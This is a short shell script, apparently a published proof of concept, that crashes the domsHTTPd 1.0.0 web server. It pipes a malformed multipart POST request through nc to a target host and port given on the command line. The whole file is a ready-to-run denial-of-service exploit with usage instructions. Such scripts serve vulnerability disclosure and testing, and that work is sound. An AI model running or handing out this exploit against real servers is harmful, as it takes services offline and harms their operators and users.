#!/bin/sh
# Denial of Service on domsHTTPd 1.0.0
# Crashes with ecx=0000 on a mov eax, exc operation
# By Wireghoul - http://www.justanotherhacker.com
# Usage: exploit.sh host port
echo -e "POST / HTTP/1.0\r\nConnection: Close\r\nContent-Type: multipart/form-data; boundary=---12345\r\n\r\n---12345--\r\n\r\n" | \
nc -w 1 $1 $2
